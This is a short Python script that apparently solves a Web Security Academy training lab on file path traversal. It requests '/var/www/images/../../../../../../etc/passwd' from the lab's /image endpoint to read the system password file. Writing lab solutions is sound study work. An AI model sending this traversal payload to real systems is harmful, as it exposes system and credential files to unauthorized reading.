# Lab: File path traversal, validation of start of path
# difficulty: practitioner

import requests
from urllib.parse import quote

sub = '0a90004a037fa62080e6f8c40056004e'
url = f'https://{sub}.web-security-academy.net'

def main():
    params = {'filename': '/var/www/images/../../../../../../etc/passwd'}

    endpoint = '/image'
    r = requests.get(url + endpoint, params=params)
    print(r.text)

if __name__ == '__main__':
    main()